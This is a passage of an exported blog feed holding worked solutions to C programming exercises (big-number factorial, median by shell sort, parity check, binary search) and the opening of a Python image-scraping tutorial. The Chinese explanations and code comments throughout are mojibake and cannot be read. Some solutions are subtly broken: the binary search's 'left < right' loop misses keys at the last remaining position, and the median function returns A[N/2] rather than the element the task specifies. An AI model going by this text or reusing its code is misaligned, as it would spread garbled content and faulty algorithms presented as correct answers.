Print_Factorial(N);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">15</span><br><span class="line">è¾“å‡º</span><br><span class="line">1307674368000</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-8"><a href="#è§£ç­”-8" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>æ˜“é”™ç‚¹æœ‰2ä¸ª</p>
<ol>
<li>å½“Nè¿‡å¤§æ—¶ï¼Œ<code>long int</code> ä¹Ÿæ— æ³•æ»¡è¶³è§£çš„è¦æ±‚</li>
<li>ç”¨æ•°ç»„å­˜æ”¾ç»“æœæ—¶ï¼Œè¦æ³¨æ„ <code>è¿›ä½</code> åœ¨è¿›è¡Œæœ€é«˜ä½è®¡ç®—å®Œæ¯•åï¼Œè¿›ä½å¯èƒ½æ˜¯å¤šä½æ•°ï¼›ç»“æœåœ¨æ•°ç»„ä¸­å­˜æ”¾çš„æ˜¯0~k-1ä½ä¸”é«˜ä½åœ¨åï¼Œä½ä½åœ¨å‰</li>
</ol>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Factorial</span> <span class="params">( <span class="keyword">const</span> <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid input"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(N&lt;=<span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">                sum *= i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%ld"</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (N &gt; <span class="number">12</span> &amp;&amp; N &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum[<span class="number">3000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">/* ç¡®ä¿ä¿å­˜æœ€ç»ˆè¿ç®—ç»“æœçš„æ•°ç»„è¶³å¤Ÿå¤§ï¼š</span></span><br><span class="line"><span class="comment">        1-9ç›¸ä¹˜æœ€å¤šæœ‰9ä½ï¼Œ10-99ç›¸ä¹˜æœ€å¤šæœ‰2*90=180ä½</span></span><br><span class="line"><span class="comment">        100-999ç›¸ä¹˜æœ€å¤šæœ‰3*900=2700ä½ï¼Œ1000æ˜¯4*1=4ä½</span></span><br><span class="line"><span class="comment">        æ€»è®¡2893ä½ */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> temp, i, j;</span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">1</span>;  <span class="comment">// ä½æ•°</span></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;  <span class="comment">// è¿›ä½</span></span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">1</span>;   <span class="comment">//å°†ç»“æœå…ˆåˆå§‹åŒ–ä¸º1</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=N;i++) &#123; <span class="comment">//å¼€å§‹é˜¶ä¹˜ï¼Œé˜¶ä¹˜å…ƒç´ ä»2å¼€å§‹</span></span><br><span class="line">        <span class="comment">//å’Œå¹³æ—¶ä¹˜æ³•æ–¹æ³•ç›¸åŒï¼Œå°†ä¸´æ—¶ç»“æœçš„æ¯ä½ä¸é˜¶ä¹˜å…ƒç´ ç›¸ä¹˜</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;k;j++) &#123;</span><br><span class="line">                </span><br><span class="line">                temp = sum[j]*i + n;</span><br><span class="line">                <span class="comment">//ç›¸åº”é˜¶ä¹˜ä¸­çš„ä¸€é¡¹ä¸å½“å‰æ‰€å¾—ä¸´æ—¶ç»“æœçš„æŸä½ç›¸ä¹˜ï¼ˆåŠ ä¸Šè¿›ä½ï¼‰</span></span><br><span class="line">                </span><br><span class="line">                sum[j] = temp%<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//æ›´æ–°ä¸´æ—¶ç»“æœçš„ä½ä¸Šä¿¡æ¯</span></span><br><span class="line">                </span><br><span class="line">                n = temp/<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//çœ‹æ˜¯å¦æœ‰è¿›ä½</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(n!=<span class="number">0</span> &amp;&amp; j==k<span class="number">-1</span>)&#123; <span class="comment">//å¦‚æœæœ‰è¿›ä½</span></span><br><span class="line">                    k++;   <span class="comment">//å¤„ç†æœ€åè¿›ä½ä¸ºä¸¤ä½</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,sum[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºlongæ•°æ®ç±»å‹è¡¨ç¤ºçš„æ•°å­—èŒƒå›´åˆ° <code>2147483647</code><br>è€Œ<code>12!</code>æ­£å¥½æ˜¯9ä½æ•°ï¼Œæ‰€ä»¥ä»12ä¸ºåˆ†ç•Œç‚¹</p>
<p>é‡‡ç”¨æ•°ç»„æ–¹æ³•å­˜å‚¨ï¼Œè®¾ç½®è¿›ä½ã€ä½æ•°ã€ä¸´æ—¶å€¼ã€‚</p>
<p>ä¸´æ—¶å€¼ä¸€å®šè¦æ¯ä¸€ä½éƒ½ä¸ç¬¬iä¸ªå…ƒç´ ç›¸ä¹˜ã€‚</p>
<hr>
<h2 id="6-11-æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•°-25åˆ†"><a href="#6-11-æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•°-25åˆ†" class="headerlink" title="6-11 æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•° (25åˆ†)"></a>6-11 æ±‚è‡ªå®šç±»å‹å…ƒç´ åºåˆ—çš„ä¸­ä½æ•° (25åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ <code>N</code> ä¸ªé›†åˆå…ƒç´  <code>A[]</code> çš„ä¸­ä½æ•°ï¼Œå³åºåˆ—ä¸­ç¬¬<code>âŒŠ(N+1)/2âŒ‹</code>å¤§çš„å…ƒç´ ã€‚å…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨æ•°ç»„<code>A[]</code>ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ªA[]å…ƒç´ çš„ä¸­ä½æ•°ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯ <code>ElementType</code>ç±»å‹ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-10"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-10" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType A[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;A[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Median(A, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">12.30</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-9"><a href="#è§£ç­”-9" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Median</span><span class="params">( ElementType A[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    ElementType temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> gap=N/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap=gap/<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">//gapæ˜¯æ¯æ¬¡æ’åºåˆ†ç»„çš„é—´éš”ï¼Œæ¯æ¬¡é—´éš”ç¼©å°1/2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=gap; i&lt;N; i++) &#123;</span><br><span class="line">    <span class="comment">//ç›¸å½“äºåœ¨åŒä¸€ç»„å†…é‡‡ç”¨ç›´æ¥æ’å…¥æ’åº</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i-gap; j&gt;=<span class="number">0</span> &amp;&amp; A[j]&gt;A[j+gap]; j=j-gap) &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœåŒä¸€ç»„å†…å‰ä¸€ä¸ªå…ƒç´ å¤§äºç›¸éš”gapä¸ªä½ç½®çš„å…ƒç´ ï¼Œåˆ™ä¸¤è€…äº¤æ¢ä½ç½® </span></span><br><span class="line">                temp = A[j];</span><br><span class="line">                A[j] = A[j+gap];</span><br><span class="line">                A[j+gap] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[N/<span class="number">2</span>]; <span class="comment">// è¿”å›ä¸­é—´å…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">input:</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">5 2 1 3 6</span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">i=2, gap=2, j=0</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 1.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">i=3, gap=1, j=2</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 3.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">3.00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-12-åˆ¤æ–­å¥‡å¶æ€§-10åˆ†"><a href="#6-12-åˆ¤æ–­å¥‡å¶æ€§-10åˆ†" class="headerlink" title="6-12 åˆ¤æ–­å¥‡å¶æ€§ (10åˆ†)"></a>6-12 åˆ¤æ–­å¥‡å¶æ€§ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°åˆ¤æ–­ç»™å®šæ•´æ•°å¥‡å¶æ€§çš„å‡½æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>n</code> æ˜¯ç”¨æˆ·ä¼ å…¥çš„æ•´å‹å‚æ•°ã€‚å½“ <code>nä¸ºå¶æ•°</code> æ—¶ï¼Œå‡½æ•°è¿”å›1ï¼›<code>nä¸ºå¥‡æ•°</code> æ—¶è¿”å›0ã€‚æ³¨æ„ï¼š0æ˜¯å¶æ•°ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-11"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-11" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> (even(n))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is even.\n"</span>, n);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d is odd.\n"</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">-6</span><br><span class="line">5</span><br><span class="line">è¾“å‡º</span><br><span class="line">-6 is even.</span><br><span class="line">5 is odd.</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-10"><a href="#è§£ç­”-10" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">even</span><span class="params">( <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(n%<span class="number">2</span>);</span><br><span class="line">    <span class="comment">/* Né™¤2å–ä½™æ•°ï¼Œå°†ä½™æ•°å€¼çš„éè¿”å›å³æˆç«‹</span></span><br><span class="line"><span class="comment">        3%2 = 1</span></span><br><span class="line"><span class="comment">        6%2 = 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-13-æŠ˜åŠæŸ¥æ‰¾-15åˆ†"><a href="#6-13-æŠ˜åŠæŸ¥æ‰¾-15åˆ†" class="headerlink" title="6-13 æŠ˜åŠæŸ¥æ‰¾ (15åˆ†)"></a>6-13 æŠ˜åŠæŸ¥æ‰¾ (15åˆ†)</h2><p>ç»™ä¸€ä¸ªä¸¥æ ¼é€’å¢æ•°åˆ—ï¼Œå‡½æ•° <code>int Search_Bin(SSTable T, KeyType k)</code> ç”¨æ¥äºŒåˆ†åœ°æŸ¥æ‰¾kåœ¨æ•°åˆ—ä¸­çš„ä½ç½®ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span></span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­Tæ˜¯æœ‰åºè¡¨ï¼Œkæ˜¯æŸ¥æ‰¾çš„å€¼ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-12"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-12" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> KeyType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>                     </span></span><br><span class="line"><span class="class">&#123;</span> KeyType  key;                                             </span><br><span class="line">&#125; ElemType;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span> ElemType  *R; </span><br><span class="line">  <span class="keyword">int</span>  length;</span><br><span class="line">&#125; SSTable;                      </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">Create</span><span class="params">(SSTable &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span> i;</span><br><span class="line">  T.R=<span class="keyword">new</span> ElemType[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">cin</span>&gt;&gt;T.length;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=T.length;i++)</span><br><span class="line">     <span class="built_in">cin</span>&gt;&gt;T.R[i].key;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  SSTable T;  KeyType k;</span><br><span class="line">   Create(T);</span><br><span class="line">   <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">   <span class="keyword">int</span> pos=Search_Bin(T,k);</span><br><span class="line">   <span class="keyword">if</span>(pos==<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"NOT FOUND"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;pos&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¯·åœ¨è¿™é‡Œå¡«å†™ç­”æ¡ˆ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰åºè¡¨çš„å…ƒç´ ä¸ªæ•°</span><br><span class="line">æ¥ä¸‹æ¥ä¸€è¡Œnä¸ªæ•°å­—ï¼Œä¾æ¬¡ä¸ºè¡¨å†…å…ƒç´ å€¼ã€‚</span><br><span class="line">ç„¶åè¾“å…¥ä¸€ä¸ªè¦æŸ¥æ‰¾çš„å€¼ã€‚</span><br><span class="line">5</span><br><span class="line">1 3 5 7 9</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">è¾“å‡ºè¿™ä¸ªå€¼åœ¨è¡¨å†…çš„ä½ç½®</span><br><span class="line">å¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œè¾“å‡º&quot;NOT FOUND&quot;ã€‚</span><br><span class="line">4</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-11"><a href="#è§£ç­”-11" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">Search_Bin</span><span class="params">(SSTable T, KeyType k)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> left = <span class="number">1</span>; <span class="comment">//å·¦è¾¹èµ·å§‹ç‚¹</span></span><br><span class="line">    <span class="keyword">int</span> right = T.length; <span class="comment">// é“¾è¡¨æœ€åä¸€ä½</span></span><br><span class="line">    <span class="keyword">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key == k) &#123; <span class="comment">// æ‰¾åˆ°k, kä¸ºT.R[mid].key</span></span><br><span class="line">            <span class="keyword">return</span> mid;  <span class="comment">// è¿”å›midå³kçš„ä½ç½®</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.R[mid].key &gt; k) &#123; <span class="comment">// kåœ¨ä¸­é—´åå·¦</span></span><br><span class="line">            right = mid<span class="number">-1</span>; <span class="comment">// ä½¿å³è¾¹ç•Œæ”¶ç¼©åˆ° ä¸­é—´å·¦ä¸€</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// kåœ¨ä¸­é—´åå³</span></span><br><span class="line">            left = mid+<span class="number">1</span>; <span class="comment">// ä½¿å·¦è¾¹ç•Œæ”¶ç¼©åˆ° ä¸­é—´å³ä¸€</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//é‡å¤ä»¥ä¸Šæ“ä½œï¼Œç›´è‡³å·¦å³è¾¹ç•Œç›¸é‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Python çˆ¬è™«å­¦ä¹ è®°å½•</title>
    <url>/yakko117/2020/02/28/pySpider/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="çˆ¬è™«å­¦ä¹ "><a href="#çˆ¬è™«å­¦ä¹ " class="headerlink" title="çˆ¬è™«å­¦ä¹ "></a>çˆ¬è™«å­¦ä¹ </h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul>
<li>å‘æµè§ˆå™¨å‘é€è¯·æ±‚ï¼Œè·å–å“åº”</li>
<li>å¾—åˆ° <code>200å›æ˜¾</code> åï¼Œéœ€è¦è¿›è¡Œ<code>htmlè§£æ</code><ul>
<li>åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶æ¥è§£æ <code>html(é€šè¿‡æ­£åˆ™åŒ¹é…</code></li>
<li>è°ƒç”¨ <code>bs4</code> è§£ææˆ‘ä»¬çš„html ï¼ˆ<code>html5lib</code> â€“å¯ä»¥é€šè¿‡æµè§ˆå™¨çš„å½¢å¼å–è§£æç½‘é¡µï¼‰</li>
<li>éœ€è¦å»è·å–æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼šå›¾ç‰‡ -&gt; <code>img æ ‡ç­¾</code> -&gt; <code>srcå±æ€§å€¼</code></li>
<li>å†é€šè¿‡srcè·¯å¾„å‘æµè§ˆå™¨å‘é€è¯·æ±‚</li>
<li>è¯·æ±‚æˆåŠŸä»¥å,å°†æˆ‘ä»¬çš„å›¾ç‰‡ä¿¡æ¯ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¿›è¡Œå†™å…¥æˆ‘ä»¬çš„æ–‡ä»¶ä¸­</li>
<li>å®ç°æ‰¹é‡çˆ¬å–</li>
</ul>
</li>
</ul>
<hr>
<h2 id="å®ä¾‹1-æ‰¹é‡è·å–å›¾ç‰‡"><a href="#å®ä¾‹1-æ‰¹é‡è·å–å›¾ç‰‡" class="headerlink" title="å®ä¾‹1 æ‰¹é‡è·å–å›¾ç‰‡"></a>å®ä¾‹1 æ‰¹é‡è·å–å›¾ç‰‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä¸‹è½½è·¯å¾„</span></span><br><span class="line">download = <span class="string">"images/"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download):</span><br><span class="line">    os.mkdir(download)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># çˆ¬å–ç½‘ç«™è·¯å¾„</span></span><br><span class="line">        url=<span class="string">"http://sc.chinaz.com/tupian/index.html"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">"http://sc.chinaz.com/tupian/index_%d.html"</span>%i</span><br><span 